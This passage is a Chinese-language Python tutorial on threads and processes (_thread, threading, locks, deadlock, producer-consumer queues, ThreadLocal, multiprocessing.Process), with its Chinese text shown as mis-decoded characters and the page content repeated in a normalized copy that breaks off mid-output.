éç»çº¿ç¨å½æ°çåæ°\n# kwargs æ¯å¯éåæ°\n\n\n1\n2\n3\n4\n\n\nåå»ºçº¿ç¨ç¤ºä¾ä»£ç ï¼\n\nimport _thread\nimport time\ndef fun1():\n    print('å¼å§è¿è¡fun1')\n    time.sleep(4)\n    print('è¿è¡fun1ç»æ')\ndef fun2():\n    print('å¼å§è¿è¡fun2')\n    time.sleep(2)\n    print('è¿è¡fun2ç»æ')\nif __name__=='__main__':\n    print('å¼å§è¿è¡')\n    #å¯å¨ä¸ä¸ªçº¿ç¨è¿è¡å½æ°fun1\n    _thread.start_new_thread(fun1,())\n     #å¯å¨ä¸ä¸ªçº¿ç¨è¿è¡å½æ°fun2\n    _thread.start_new_thread(fun2,())\n    time.sleep(6)\n\"\"\"\nå¼å§è¿è¡\nå¼å§è¿è¡fun1\nå¼å§è¿è¡fun2\nè¿è¡fun2ç»æ\nè¿è¡fun1ç»æ\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\nä»ç¨åºè¿è¡ç»æå¯ä»¥çåºï¼å¨fun2å½æ°ä¸­è°ç¨äºsleepå½æ°ä¼ç ï¼å½ä¼ç æé´ï¼ä¼éæ¾CPUçè®¡ç®èµæºï¼è¿æ¶fun1æ¢å äºCPUèµæºå¼å§æ§è¡ã\n\nå¸¦åæ°ççº¿ç¨ç¤ºä¾ä»£ç ï¼\n\nimport _thread\nimport time\ndef fun1(thread_name,delay):\n    print('çº¿ç¨{0}å¼å§è¿è¡fun1'.format(thread_name))\n    time.sleep(delay)\n    print('çº¿ç¨{0}è¿è¡fun1ç»æ'.format(thread_name))\ndef fun2(thread_name,delay):\n    print('çº¿ç¨{0}å¼å§è¿è¡fun2'.format(thread_name))\n    time.sleep(2)\n    print('çº¿ç¨{0}è¿è¡fun2ç»æ'.format(thread_name))\nif __name__=='__main__':\n    print('å¼å§è¿è¡')\n    #å¯å¨ä¸ä¸ªçº¿ç¨è¿è¡å½æ°fun1\n    _thread.start_new_thread(fun1,('thread-1',4))\n     #å¯å¨ä¸ä¸ªçº¿ç¨è¿è¡å½æ°fun2\n    _thread.start_new_thread(fun2,('thread-2',2))\n    time.sleep(6)\n\"\"\"\nå¼å§è¿è¡\nçº¿ç¨thread-1å¼å§è¿è¡fun1\nçº¿ç¨thread-2å¼å§è¿è¡fun2\nçº¿ç¨thread-2è¿è¡fun2ç»æ\nçº¿ç¨thread-1è¿è¡fun1ç»æ\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\nä»è¾åºç»æå¯ä»¥çåºï¼ç±äºæ¯ä¸ªçº¿ç¨å½æ°çä¼ç æ¶é´å¯è½é½ä¸ç¸åï¼æä»¥éæºè¾åºäºè¿ä¸ªç»æï¼æ¯æ¬¡è¿è¡ç¨åºï¼è¾åºçç»ææ¯ä¸ä¸æ ·çã\n\n\n# threadingæ¨¡å\n\nPython3 éè¿ä¸¤ä¸ªæ ååº _thread å threading æä¾å¯¹çº¿ç¨çæ¯æã_thread æä¾äºä½çº§å«çãåå§ççº¿ç¨ä»¥åä¸ä¸ªç®åçéï¼å®ç¸æ¯äº threading æ¨¡åçåè½è¿æ¯æ¯è¾æéçã\n\nthreading æ¨¡åé¤äºåå«_thread æ¨¡åä¸­çæææ¹æ³å¤ï¼è¿æä¾çå¶ä»æ¹æ³ï¼\n\n * threading.currentThread(): è¿åå½åççº¿ç¨åéã\n * threading.enumerate(): è¿åä¸ä¸ªåå«æ­£å¨è¿è¡ççº¿ç¨çlistãæ­£å¨è¿è¡æçº¿ç¨å¯å¨åãç»æåï¼ä¸åæ¬å¯å¨ååç»æ­¢åççº¿ç¨ã\n * threading.activeCount(): è¿åæ­£å¨è¿è¡ççº¿ç¨æ°éï¼ä¸len(threading.enumerate())æç¸åçç»æã\n\nå¨Python3ç¨åºä¸­ï¼å¯¹å¤çº¿ç¨æ¯ææå¥½çæ¯threadingæ¨¡åï¼ä½¿ç¨è¿ä¸ªæ¨¡åï¼å¯ä»¥çµæ´»å°åå»ºå¤çº¿ç¨ç¨åºï¼å¹¶ä¸å¯ä»¥å¨å¤çº¿ç¨ä¹é´è¿è¡åæ­¥åéä¿¡ãå¨Python3ç¨åºä¸­ï¼å¯ä»¥éè¿å¦ä¸ä¸¤ç§æ¹å¼æ¥åå»ºçº¿ç¨ï¼\n\n * éè¿threading.Threadç´æ¥å¨çº¿ç¨ä¸­è¿è¡å½æ°\n * éè¿ç»§æ¿ç±»threading.Threadæ¥åå»ºçº¿ç¨\n\nå¨Pythonä¸­ä½¿ç¨threading.Threadçåºæ¬è¯­æ³æ ¼å¼å¦ä¸æç¤ºï¼\n\nThread(group=None, target=None, name=None, args=(), kwargs={})\n\n\n1\n\n\nThreadç±»çæåæ¹æ³ï¼\n\næ¹æ³å            æè¿°\nrun()          ç¨ä»¥è¡¨ç¤ºçº¿ç¨æ´»å¨çæ¹æ³\nstart()        å¯å¨çº¿ç¨æ´»å¨\njoin([time])   ç­å¾è³çº¿ç¨ä¸­æ­¢ãè¿é»å¡è°ç¨çº¿ç¨ç´è³çº¿ç¨çjoin() æ¹æ³è¢«è°ç¨ä¸­æ­¢-æ­£å¸¸éåºæèæåºæªå¤ççå¼å¸¸-æèæ¯å¯éçè¶æ¶åç\nisAlive()      è¿åçº¿ç¨æ¯å¦æ´»å¨ç\ngetName()      è¿åçº¿ç¨å\nsetName()      è®¾ç½®çº¿ç¨å\n\nåå»ºçº¿ç¨çç¤ºä¾ä»£ç ï¼\n\nimport threading\nimport time\ndef fun1(thread_name,delay):\n    print('çº¿ç¨{0}å¼å§è¿è¡fun1'.format(thread_name))\n    time.sleep(delay)\n    print('çº¿ç¨{0}è¿è¡fun1ç»æ'.format(thread_name))\ndef fun2(thread_name,delay):\n    print('çº¿ç¨{0}å¼å§è¿è¡fun2'.format(thread_name))\n    time.sleep(delay)\n    print('çº¿ç¨{0}è¿è¡fun2ç»æ'.format(thread_name))\nif __name__=='__main__':\n    print('å¼å§è¿è¡')\n    #åå»ºçº¿ç¨\n    t1=threading.Thread(target=fun1,args=('thread-1',2))\n    t2=threading.Thread(target=fun2,args=('thread-2',4))\n    t1.start()\n    t2.start()\n\"\"\"\nå¼å§è¿è¡\nçº¿ç¨thread-1å¼å§è¿è¡fun1\nçº¿ç¨thread-2å¼å§è¿è¡fun2\nçº¿ç¨thread-1è¿è¡fun1ç»æ\nçº¿ç¨thread-2è¿è¡fun2ç»æ\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\nå¨Pythonä¸­ï¼éè¿ç»§æ¿ç±»threading.Threadçæ¹å¼æ¥åå»ºä¸ä¸ªçº¿ç¨ãè¿ç§æ¹æ³åªè¦éåç±»threading.Threadä¸­çæ¹æ³run()ï¼ç¶ååè°ç¨æ¹æ³start()å°±è½åå»ºçº¿ç¨ï¼å¹¶è¿è¡æ¹æ³run()ä¸­çä»£ç ã\n\nç»§æ¿Threadç±»åå»ºçº¿ç¨ï¼\n\nimport threading\nimport time\ndef fun1(delay):\n    print('çº¿ç¨{0}å¼å§è¿è¡fun1'.format(threading.current_thread().name))\n    time.sleep(delay)\n    print('çº¿ç¨{0}è¿è¡fun1ç»æ'.format(threading.current_thread().name))\ndef fun2(delay):\n    print('çº¿ç¨{0}å¼å§è¿è¡fun2'.format(threading.current_thread().name))\n    time.sleep(2)\n    print('çº¿ç¨{0}è¿è¡fun2ç»æ'.format(threading.current_thread().name))\n#åå»ºçº¿ç¨ç±»ç»§æ¿threading.Thread\nclass MyThread(threading.Thread):\n    #éåç¶ç±»çæé æ¹æ³ï¼å¶ä¸­funcæ¯çº¿ç¨å½æ°ï¼argsæ¯ä¼ å¥çº¿ç¨çåæ°,nameæ¯çº¿ç¨å\n    def __init__(self,func,name,args):\n        super().__init__(target=func,name=name,args=args)\n    #éåç¶ç±»çrun()æ¹æ³\n    def run(self):\n        self._target(*self._args)\n\nif __name__=='__main__':\n    print('å¼å§è¿è¡')\n    #åå»ºçº¿ç¨\n    t1=MyThread(fun1,'thread-1',(2,))\n    t2=MyThread(fun2,'thread-2',(4,))\n    t1.start()\n    t2.start()\n\n\"\"\"\nå¼å§è¿è¡\nçº¿ç¨thread-1å¼å§è¿è¡fun1\nçº¿ç¨thread-2å¼å§è¿è¡fun2\nçº¿ç¨thread-1è¿è¡fun1ç»æ\nçº¿ç¨thread-2è¿è¡fun2ç»æ\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\nå¨è°ç¨Threadç±»çæé æ¹æ³æ¶ï¼éè¦å°çº¿ç¨å½æ°ãåæ°ç­å¼ä¼ å¥æé æ¹æ³ï¼å¶ä¸­nameè¡¨ç¤ºçº¿ç¨çåå­ï¼å¦æä¸æå®è¿ä¸ªåæ°ï¼é»è®¤ççº¿ç¨åå­æ ¼å¼ä¸ºThread-1ãThread-2ãæ¯ä¸ä¸ªä¼ å¥æé æ¹æ³çåæ°å¼ï¼å¨Threadç±»ä¸­é½æå¯¹åºçæååéä¿å­è¿äºå¼ï¼è¿äºæååéé½ä»¥ä¸åçº¿(_)å¼å¤´ï¼å¦æ_targetã_argsç­ãå¨runæ¹æ³ä¸­éè¦ä½¿ç¨è¿äºåéè°ç¨ä¼ å¥ççº¿ç¨å½æ°ï¼å¹¶ä¸ºçº¿ç¨å½æ°ä¼ éåæ°ã\n\n\n# çº¿ç¨å±äº«å¨å±åé\n\nå¨ä¸ä¸ªè¿ç¨åææçº¿ç¨å±äº«å¨å±åéï¼å¤çº¿ç¨ä¹é´çæ°æ®å±äº«æ¯å¤è¿ç¨è¦å¥½ãä½æ¯å¯è½é æå¤ä¸ªè¿ç¨åæ¶ä¿®æ¹ä¸ä¸ªåéï¼å³çº¿ç¨éå®å¨ï¼ï¼å¯è½é ææ··ä¹±ã\n\nçº¿ç¨ä¹é´çå¨å±åéå¯å±äº«ï¼\n\nimport time\nfrom threading import *\n#å®ä¹å¨å±åénum\nnum=10\ndef test1():\n    global num\n    for i in range(3):\n        num+=1\n    print('test1è¾åºnum:',num)\n\ndef test2():\n    global num\n    print('test2è¾åºnum:',num)\n\nif __name__=='__main__':\n    t1=Thread(target=test1)\n    t2=Thread(target=test2)\n    t1.start()\n    t1.join()\n    t2.start()\n    t2.join()\n\n\"\"\"\ntest1è¾åºnum: 13\ntest2è¾åºnum: 13\n\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\nçº¿ç¨ä¹é´çå¨å±åéå±äº«å­å¨çé®é¢ï¼\n\nimport time\nfrom threading import *\n#å®ä¹å¨å±åénum\nnum=0\ndef test1():\n    global num\n    for i in range(100000):\n        num+=1\n    print('test1è¾åºnum:',num)\n\ndef test2():\n    global num\n    for i in range(100000):\n        num+=1\n    print('test2è¾åºnum:',num)\n\nif __name__=='__main__':\n    t1=Thread(target=test1)\n    t2=Thread(target=test2)\n    t1.start()\n    t2.start()\n    t1.join()\n    t2.join()\n\n\n\"\"\"\ntest1è¾åºnum: 196538\ntest2è¾åºnum: 200000\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# é\n\n\n# äºæ¥é\n\nå¦æå¤ä¸ªçº¿ç¨å±åå¯¹æä¸ªæ°æ®ä¿®æ¹ï¼åå¯è½åºç°ä¸å¯é¢æçç»æï¼ä¸ºäºä¿è¯æ°æ®çæ­£ç¡®æ§ï¼éè¦å¯¹å¤ä¸ªçº¿ç¨è¿è¡åæ­¥ãæç®åçåæ­¥æºå¶å°±æ¯å¼å¥äºæ¥éã\n\néæä¸¤ç§ç¶æââéå®åæªéå®ãæä¸ªçº¿ç¨è¦æ´æ¹å±äº«æ°æ®æ¶ï¼åå°å¶éå®ï¼æ­¤æ¶èµæºçç¶æä¸ºâéå®âï¼å¶ä»çº¿ç¨ä¸è½æ´æ¹ï¼ç´å°è¯¥çº¿ç¨éæ¾èµæºï¼å°èµæºçç¶æåæâééå®âç¶æï¼å¶ä»ççº¿ç¨æè½åæ¬¡éå®è¯¥èµæºãäºæ¥éä¿è¯äºæ¯æ¬¡åªæä¸ä¸ªçº¿ç¨è¿è¡åå¥æä½ï¼ä»èä¿è¯äºå¤çº¿ç¨æåµä¸æ°æ®çæ­£ç¡®æ§ã\n\nä½¿ç¨ Thread å¯¹è±¡ç Lock å¯ä»¥å®ç°ç®åççº¿ç¨åæ­¥ï¼æä¸é acquire æ¹æ³å éæ¾release æ¹æ³ï¼å¯¹äºé£äºéè¦æ¯æ¬¡åªåè®¸ä¸ä¸ªçº¿ç¨æä½çæ°æ®ï¼å¯ä»¥å°å¶æä½æ¾å° acquire å release æ¹æ³ä¹é´ã\n\näºæ¥éçç¤ºä¾ä»£ç ï¼\n\nimport time\nfrom threading import Thread,Lock\n#å®ä¹å¨å±åénum\nnum=0\n#åå»ºä¸æäºæ¥é\nmutex=Lock()\ndef test1():\n    global num\n    '''\n    å¨ä¸¤ä¸ªçº¿ç¨ä¸­é½è°ç¨ä¸éçæ¹æ³ï¼åè¿ä¸¤ä¸ªçº¿ç¨å°±ä¼æ¢çä¸éï¼\n    å¦ææ1æ¹æåä¸éï¼é£ä¹å¯¼è´å¦å¤ä¸æ¹ä¼å µå¡ï¼ä¸ç´ç­å¾ï¼ç´å°è¿ä¸ªéè¢«è§£å¼\n    '''\n    mutex.acquire()#ä¸é\n    for i in range(100000):\n        num+=1\n    mutex.release()\n    print('test1è¾åºnum:',num)\n\ndef test2():\n    global num\n    mutex.acquire()  # ä¸é\n    for i in range(100000):\n        num+=1\n    mutex.release()\n    print('test2è¾åºnum:',num)\n\nif __name__=='__main__':\n    t1=Thread(target=test1)\n    t2=Thread(target=test2)\n    t1.start()\n    t2.start()\n    t1.join()\n    t2.join()\n\n\n\"\"\"\ntest1è¾åºnum: 100000\ntest2è¾åºnum: 200000\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\näºæ¥éçé®é¢ä¼åï¼\n\nimport time\nfrom threading import Thread,Lock\n#å®ä¹å¨å±åénum\nnum=0\n#åå»ºä¸æäºæ¥é\nmutex=Lock()\ndef test1():\n    global num\n    '''\n    å¨ä¸¤ä¸ªçº¿ç¨ä¸­é½è°ç¨ä¸éçæ¹æ³ï¼åè¿ä¸¤ä¸ªçº¿ç¨å°±ä¼æ¢çä¸éï¼\n    å¦ææ1æ¹æåä¸éï¼é£ä¹å¯¼è´å¦å¤ä¸æ¹ä¼å µå¡ï¼ä¸ç´ç­å¾ï¼ç´å°è¿ä¸ªéè¢«è§£å¼\n    '''\n    for i in range(100000):\n        mutex.acquire()  # ä¸é\n        num+=1\n        mutex.release()\n    print('test1è¾åºnum:',num)\n\ndef test2():\n    global num\n    for i in range(100000):\n        mutex.acquire()  # ä¸é\n        num+=1\n        mutex.release()\n    print('test2è¾åºnum:',num)\n\nif __name__=='__main__':\n    t1=Thread(target=test1)\n    t2=Thread(target=test2)\n    t1.start()\n    t2.start()\n    t1.join()\n    t2.join()\n\n\"\"\"\ntest1è¾åºnum: 169163\ntest2è¾åºnum: 200000\n\"\"\"\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\n\n# æ­»é\n\nå¨çº¿ç¨å±äº«å¤ä¸ªèµæºçæ¶åï¼å¦æä¸¤ä¸ªçº¿ç¨åå«å æä¸é¨åèµæºå¹¶ä¸åæ¶ç­å¾å¯¹æ¹çèµæºï¼å°±ä¼é ææ­»éã\n\nimport time\nfrom threading import Thread,Lock\nimport threading\nmutexA=threading.Lock()\nmutexB=threading.Lock()\nclass MyThread1(Thread):\n    def run(self):\n        if mutexA.acquire():\n            print(self.name,'æ§è¡')\n            time.sleep(1)\n            if mutexB.acquire():\n                print(self.name,'æ§è¡')\n                mutexB.release()\n            mutexA.release()\n\n\nclass MyThread2(Thread):\n    def run(self):\n        if mutexB.acquire():\n            print(self.name,'æ§è¡')\n            time.sleep(1)\n            if mutexA.acquire():\n                print(self.name,'æ§è¡')\n                mutexA.release()\n            mutexB.release()\n\nif __name__ == '__main__':\n    t1=MyThread1()\n    t2=MyThread2()\n    t1.start()\n    t2.start()\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n\n\n\n# çº¿ç¨åæ­¥\n\nåæ­¥å°±æ¯ååæ­¥è°ï¼æé¢å®çååæ¬¡åºè¿è¡è¿è¡ãä¾å¦ï¼å¼ä¼ãâåâå­æååãåå©ãäºç¸éåã\n\nå¦è¿ç¨ãçº¿ç¨åæ­¥ï¼å¯ä»¥çè§£ä¸ºè¿ç¨æçº¿ç¨AåBä¸åéåï¼Aæ§è¡å°ä¸å®ç¨åº¦æ¶è¦ä¾é Bçæä¸ªç»æï¼äºæ¯åä¸æ¥ï¼ç¤ºæBè¿è¡ï¼Bè¿è¡åå°ç»æç»Aï¼Aç»§ç»­è¿è¡ã\n\nimport time\nfrom threading import Thread,Lock\nimport threading\nlock1=Lock()\nlock2=Lock()\nlock3=Lock()\nlock2.acquire()\nlock3.acquire()\nclass Task1(Thread):\n    def run(self):\n        while True:\n            if lock1.acquire():\n                print('...task1...')\n                time.sleep(1)\n                lock2.release()\n\nclass Task2(Thread):\n    def run(self):\n        while True:\n            if lock2.acquire():\n                print('...task2...')\n                time.sleep(1)\n                lock3.release()\n\nclass Task3(Thread):\n    def run(self):\n        while True:\n            if lock3.acquire():\n                print('...task3...')\n                time.sleep(1)\n                lock1.release()\n\nif __name__ == '__main__':\n    t1=Task1()\n    t2=Task2()\n    t3=Task3()\n    t1.start()\n    t2.start()\n    t3.start()\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n\n# çäº§èåæ¶è´¹èæ¨¡å¼\n\nçäº§èå°±æ¯çäº§æ°æ®ççº¿ç¨ï¼æ¶è´¹èå°±æ¯æ¶è´¹æ°æ®ççº¿ç¨ãå¨å¤çº¿ç¨å¼åå½ä¸­ï¼å¦æçäº§èå¤çéåº¦å¾å¿«ï¼èæ¶è´¹èå¤çéåº¦å¾æ¢ï¼é£ä¹çäº§èå°±å¿é¡»ç­å¾æ¶è´¹èå¤çå®ï¼æè½ç»§ç»­çäº§æ°æ®ãåæ ·çéçï¼å¦ææ¶è´¹èçå¤çè½åå¤§äºçäº§èï¼é£ä¹æ¶è´¹èå°±å¿é¡»ç­å¾çäº§èãä¸ºäºè§£å³è¿ä¸ªé®é¢äºæ¯å¼å¥çäº§èåæ¶è´¹èæ¨¡å¼\n\nçäº§èæ¶è´¹èæ¨¡å¼éè¿ä¸ä¸ªå®¹å¨æ¥è§£å³çäº§èåæ¶è´¹èçå¼ºè¦åé®é¢ãçäº§èåæ¶è´¹èä¹é´ä¸ç´æ¥éä¿¡ãçäº§èçäº§ååï¼ç¶åå°å¶æ¾å°ç±»ä¼¼éåçæ°æ®ç»æä¸­ï¼æ¶è´¹èä¸æ¾çäº§èè¦æ°æ®ï¼èæ¯ç´æ¥ä»éåä¸­åãè¿éä½¿ç¨queueæ¨¡åæ¥æä¾çº¿ç¨é´éä¿¡çæºå¶ï¼ä¹å°±æ¯è¯´ï¼çäº§èåæ¶è´¹èå±äº«ä¸ä¸ªéåãçäº§èçäº§åååï¼ä¼å°ååæ·»å å°éåä¸­ãæ¶è´¹èæ¶è´¹ååï¼ä¼ä»éåä¸­ååºååã\n\nçäº§èåæ¶è´¹èæ¨¡åç¤ºä¾ä»£ç ï¼\n\nimport time\nimport threading\nfrom queue import Queue\nclass Producer(threading.Thread):\n    def run(self):\n        global queue\n        count=0\n        while True:\n            if queue.qsize()<1000:\n                for i in range(100):\n                    count += 1\n                    msg = 'çæäº§å' + str(count)\n                    queue.put(msg)\n                    print(msg)\n            time.sleep(0.5)\nclass Consumer(threading.Thread):\n    def run(self):\n        global queue\n        while True:\n            if queue.qsize()>100:\n                for i in range(3):\n                    msg=self.name+'æ¶è´¹äº'+queue.get()\n                    print(msg)\n            time.sleep(1)\nif __name__ == '__main__':\n    queue = Queue()\n    p=Producer()\n    p.start()\n    time.sleep(1)\n    c=Consumer()\n    c.start()\n\n    \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n\n# ThreadLocal\n\næä»¬ç¥éå¤çº¿ç¨ç¯å¢ä¸ï¼æ¯ä¸ä¸ªçº¿ç¨åå¯ä»¥ä½¿ç¨æå±è¿ç¨çå¨å±åéãå¦æä¸ä¸ªçº¿ç¨å¯¹å¨å±åéè¿è¡äºä¿®æ¹ï¼å°ä¼å½±åå°å¶ä»ææççº¿ç¨å¯¹å¨å±åéçè®¡ç®æä½ï¼ä»èåºç°æ°æ®æ··ä¹±ï¼å³ä¸ºèæ°æ®ãä¸ºäºé¿åå¤ä¸ªçº¿ç¨åæ¶å¯¹åéè¿è¡ä¿®æ¹ï¼å¼å¥äºçº¿ç¨åæ­¥æºå¶ï¼éè¿äºæ¥éæ¥æ§å¶å¯¹å¨å±åéçè®¿é®ãæä»¥ææ¶åçº¿ç¨ä½¿ç¨å±é¨åéæ¯å¨å±åéå¥½ï¼å ä¸ºå±é¨åéåªæçº¿ç¨èªèº«å¯ä»¥è®¿é®ï¼åä¸ä¸ªè¿ç¨ä¸çå¶ä»çº¿ç¨ä¸å¯è®¿é®ãä½æ¯å±é¨åéä¹æ¯æé®é¢ï¼å°±æ¯å¨å½æ°è°ç¨çæ¶åï¼ä¼ éèµ·æ¥å¾éº»ç¦ãç¤ºä¾å¦ä¸ï¼\n\ndef process_student(name):\n    std=Student(name)\n    do_task1(std)\n    do_task2(std)\n    \ndef do_task1(std):\n    do_sub_task1(std)\n    do_sub_task2(std)\n    \ndef do_task2(std):\n    do_sub_task1(std)\n    do_sub_task2(std)\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nä»ä¸é¢çå®ä¾å¯ä»¥çå°æ¯ä¸ªå½æ°ä¸å±ä¸å±è°ç¨é½éè¦ä¼ éstdåæ°ï¼éå¸¸éº»ç¦ï¼å¦æä½¿ç¨å¨å±åéä¹ä¸è¡ï¼å ä¸ºæ¯ä¸ªçº¿ç¨å¤çä¸åçStudentå¯¹è±¡ï¼ä¸è½å±äº«ãå æ­¤ Python è¿æä¾äºThreadLocal åéï¼å®æ¬èº«æ¯ä¸ä¸ªå¨å±åéï¼ä½æ¯æ¯ä¸ªçº¿ç¨å´å¯ä»¥å©ç¨å®æ¥ä¿å­å±äºèªå·±çç§ææ°æ®ï¼è¿äºç§ææ°æ®å¯¹å¶ä»çº¿ç¨ä¹æ¯ä¸å¯è§çã\n\nimport threading\n# åå»ºå¨å±ThreadLocalå¯¹è±¡:\nlocal = threading.local()\ndef process_student():\n    # è·åå½åçº¿ç¨å³èçname:\n    student_name = local.name\n    print('çº¿ç¨åï¼%s å­¦çå§å:%s' % (threading.current_thread().name,student_name))\ndef process_thread(name):\n    # ç»å®ThreadLocalçname:\n    local.name = name\n    process_student()\nt1 = threading.Thread(target=process_thread, args=('å¼ ä¸',), name='Thread-A')\nt2 = threading.Thread(target=process_thread, args=('æå',), name='Thread-B')\nt1.start()\nt2.start()\nt1.join()\nt2.join()\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n",normalizedContent:"# pythonå¤çº¿ç¨çé£äºäº\n\nå¤çº¿ç¨ç±»ä¼¼äºåæ¶æ§è¡å¤ä¸ªä¸åç¨åºï¼æ¯å¦å¨å±æ­çæ¶ååæ¶è·³èãpythonä¸­ä¹æä¾äºå®ç°å¤çº¿ç¨çæ¹å¼ï¼è¿ä¸ç¯ä¸èµ·æ¥çä¸ä¸pythonä¸­å¦ä½ä½¿ç¨å¤çº¿ç¨ã\n\n\n# è¿ç¨\n\nç¨åºç¼åå®æ²¡æè¿è¡ç§°ä¹ä¸ºç¨åºãæ­£å¨è¿è¡çä»£ç å°±æ¯è¿ç¨ãå¨python3è¯­è¨ä¸­ï¼å¯¹å¤è¿ç¨æ¯æçæ¯multiprocessingæ¨¡ååsubprocessæ¨¡åãmultiprocessingæ¨¡åä¸ºå¨å­è¿ç¨ä¸­è¿è¡ä»»å¡ãéè®¯åå±äº«æ°æ®ï¼ä»¥åæ§è¡åç§å½¢å¼çåæ­¥æä¾æ¯æã\n\n\n# åå»ºè¿ç¨\n\npythonæä¾äºç¨äºå¤çå¤è¿ç¨çåmultiprocessingãåå©è¿ä¸ªåï¼å¯ä»¥è½»æ¾å®æä»åè¿ç¨å°å¹¶åæ§è¡çè½¬æ¢ãmultiprocessingæ¯æå­è¿ç¨ãéä¿¡åå±äº«æ°æ®ãè¯­æ³æ ¼å¼å¦ä¸ï¼\n\nprocessï¼[group [, target [, name [, args [, kwargs]]]]]ï¼\n# target è¡¨ç¤ºè°ç¨çå¯¹è±¡\n# nameä¸ºè¿ç¨çåå­\n# args è¡¨ç¤ºè°ç¨å¯¹è±¡çåæ°\n# kargs è¡¨ç¤ºè°ç¨å¯¹è±¡çå­å¸\n# group æªä½¿ç¨ ä¸ºnone\n\n\n1\n2\n3\n4\n5\n6\n\n\nä½¿ç¨ä»¥ä¸çæé å½æ°ï¼å¯ä»¥æé åºä¸ä¸ªprocesså¯¹è±¡ï¼è¯¥å¯¹è±¡æå¦ä¸çå ç§å®ä¾æ¹æ³ï¼\n\næ¹æ³                æè¿°\nis_alive()        å¦æpä»ç¶è¿è¡ï¼è¿åtrue\njoinï¼[timeout]ï¼   ç­å¾è¿ç¨pç»æ­¢ãtimeoutæ¯å¯éçè¶æ¶æéï¼è¿ç¨å¯ä»¥è¢«é¾æ¥æ æ°æ¬¡ï¼ä½å¦æè¿æ¥èªèº«åä¼åºé\nrun()             è¿ç¨å¯å¨æ¶è¿è¡çæ¹æ³ãé»è®¤æåµä¸ï¼ä¼è°ç¨ä¼ éç»processæé å½æ°çtargetãå®ä¹è¿ç¨çå¦ä¸ç§æ¹æ³æ¯ç»§æ¿processç±»å¹¶éæ°å®ç°run()å½æ°\nstart()           å¯å¨è¿ç¨ï¼è¿å°è¿è¡ä»£è¡¨è¿ç¨çå­è¿ç¨ï¼å¹¶è°ç¨è¯¥å­è¿ç¨ä¸­çrun()å½æ°\nterminate()       å¼ºå¶ç»æ­¢è¿ç¨ãå¦æè°ç¨æ­¤å½æ°ï¼è¿ç¨på°è¢«ç«å³ç»æ­¢ï¼åæ¶ä¸ä¼è¿è¡ä»»ä½æ¸çå¨ä½ãå¦æè¿ç¨påå»ºäºå®èªå·±çå­è¿ç¨ï¼è¿äºè¿ç¨å°åä¸ºåµå°¸è¿ç¨ãä½¿ç¨æ­¤æ¹æ³æ¶éè¦ç¹å«å°å¿ãå¦æpä¿å­äºä¸ä¸ªéæåä¸äºè¿ç¨é´éä¿¡ï¼é£ä¹ç»æ­¢å®å¯è½ä¼å¯¼è´æ­»éæi/oæå\n\nåå»ºè¿ç¨çç¤ºä¾ä»£ç ï¼\n\nfrom multiprocessing import process\n\ndef process_func():\n    print(\"å­è¿ç¨æ§è¡äº\")\n    \nif __name__ == '__main__':\n    p = process(target=process_func)\n    print(\"ç¶è¿ç¨æ§è¡\")\n    print(\"å­è¿ç¨å³å°æ§è¡\")\n    p.start()\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nåå»ºå¸¦åæ°çè¿ç¨ç¤ºä¾ä»£ç ï¼\n\nfrom multiprocessing import process\nimport os\nfrom time import sleep\n#åå»ºå­è¿ç¨ä»£ç \ndef run_proc(name,age,**kwargs):\n    for i in range(5):\n        print('å­è¿ç¨è¿è¡ä¸­ï¼åæ°nameï¼%s,age:%d'%(name,age))\n        print('å­å¸åæ°kwargsï¼',kwargs)\n        sleep(0.5)\n\nif __name__=='__main__':\n    print('ä¸»è¿ç¨å¼å§è¿è¡')\n    p=process(target=run_proc,args=('test',18),kwargs={'m':23})\n    print('å­è¿ç¨å°è¦æ§è¡')\n    p.start()\n    \n    \n\"\"\"\nä¸»è¿ç¨å¼å§è¿è¡\nå­è¿ç¨å°è¦æ§è¡\nå­è¿ç¨è¿è¡ä¸­ï¼åæ°nameï¼test,age:18\nå­å¸åæ°kwargsï¼ {'m': 23}\nå­è¿ç¨è¿è¡ä¸­ï¼åæ°nameï¼test,age:18\nå­å¸åæ°kwargsï¼ {'m': 